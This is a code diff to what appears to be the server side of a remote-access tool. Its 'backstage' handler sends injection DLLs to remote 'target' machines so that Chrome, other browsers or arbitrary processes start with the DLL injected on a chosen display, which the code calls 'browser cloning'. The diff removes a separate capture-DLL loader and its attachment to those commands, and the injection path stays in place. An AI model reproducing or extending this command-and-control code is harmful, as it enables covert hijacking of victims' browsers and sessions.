@@ -38,10 +38,6 @@ let _cachedInjectionDll: Uint8Array | null = null;
 let _dllCachePath: string | null = null;
 let _dllCacheMtimeMs: number = 0;
 
-let _cachedCaptureDll: Uint8Array | null = null;
-let _captureDllCachePath: string | null = null;
-let _captureDllCacheMtimeMs: number = 0;
-
 function getInjectionDllBytes(): Uint8Array | null {
   const runtimeRoot = resolveRuntimeRoot();
   const candidates = [
@@ -83,49 +79,6 @@ function getInjectionDllBytes(): Uint8Array | null {
   }
 
   logger.warn(`[backstage] injection DLL not found. Checked: ${candidates.join(", ")}`);
-  return null;
-}
-
-function getCaptureDllBytes(): Uint8Array | null {
-  const runtimeRoot = resolveRuntimeRoot();
-  const candidates = [
-    path.resolve(runtimeRoot, "dist-clients", "BackstageCapture.x64.dll"),
-    path.resolve(process.cwd(), "dist-clients", "BackstageCapture.x64.dll"),
-    path.resolve(import.meta.dir, "../../dist-clients/BackstageCapture.x64.dll"),
-  ];
-
-  if (_captureDllCachePath) {
-    try {
-      const { statSync } = require("fs");
-      const st = statSync(_captureDllCachePath);
-      if (st.mtimeMs === _captureDllCacheMtimeMs && _cachedCaptureDll) {
-        return _cachedCaptureDll;
-      }
-      _cachedCaptureDll = new Uint8Array(readFileSync(_captureDllCachePath));
-      _captureDllCacheMtimeMs = st.mtimeMs;
-      logger.info(`[backstage] reloaded capture DLL from ${_captureDllCachePath} (${_cachedCaptureDll.length} bytes)`);
-      return _cachedCaptureDll;
-    } catch {
-      _captureDllCachePath = null;
-      _cachedCaptureDll = null;
-    }
-  }
-
-  for (const dllPath of candidates) {
-    if (!existsSync(dllPath)) continue;
-    try {
-      const { statSync } = require("fs");
-      const st = statSync(dllPath);
-      _cachedCaptureDll = new Uint8Array(readFileSync(dllPath));
-      _captureDllCachePath = dllPath;
-      _captureDllCacheMtimeMs = st.mtimeMs;
-      logger.info(`[backstage] loaded capture DLL from ${dllPath} (${_cachedCaptureDll.length} bytes)`);
-      return _cachedCaptureDll;
-    } catch {
-      continue;
-    }
-  }
-
   return null;
 }
 
@@ -1434,7 +1387,6 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
         safeSendViewer(ws, { type: "backstage_error", error: "backstage injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
         break;
       }
-      const captureDll = getCaptureDllBytes();
       const cmdPayload: Record<string, any> = {
         path: String(payload.path || ""),
         search_path: String(payload.search_path || ""),
@@ -1442,7 +1394,6 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
         dll: dllData,
         display: state.display ?? 0,
       };
-      if (captureDll) cmdPayload.capture_dll = captureDll;
       sendbackstageCommand(target, "backstage_start_process_injected", cmdPayload);
       break;
     }
@@ -1453,13 +1404,11 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
         safeSendViewer(ws, { type: "backstage_error", error: "backstage injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
         break;
       }
-      const captureDllChrome = getCaptureDllBytes();
       const chromeCmdPayload: Record<string, any> = {
         path: String(payload.path || ""),
         dll: dllData,
         display: state.display ?? 0,
       };
-      if (captureDllChrome) chromeCmdPayload.capture_dll = captureDllChrome;
       sendbackstageCommand(target, "backstage_start_chrome_injected", chromeCmdPayload);
       break;
     }
@@ -1470,7 +1419,6 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
         safeSendViewer(ws, { type: "backstage_error", error: "backstage injection DLL not found on the server. Browser cloning requires the DLL to be built and placed in the server directory.", critical: true });
         break;
       }
-      const captureDllBrowser = getCaptureDllBytes();
       const browserCmdPayload: Record<string, any> = {
         browser: String(payload.browser || ""),
         path: String(payload.path || ""),
@@ -1480,7 +1428,6 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
         dll: dllData,
         display: state.display ?? 0,
       };
-      if (captureDllBrowser) browserCmdPayload.capture_dll = captureDllBrowser;
       sendbackstageCommand(target, "backstage_start_browser_injected", browserCmdPayload);
       break;
     }
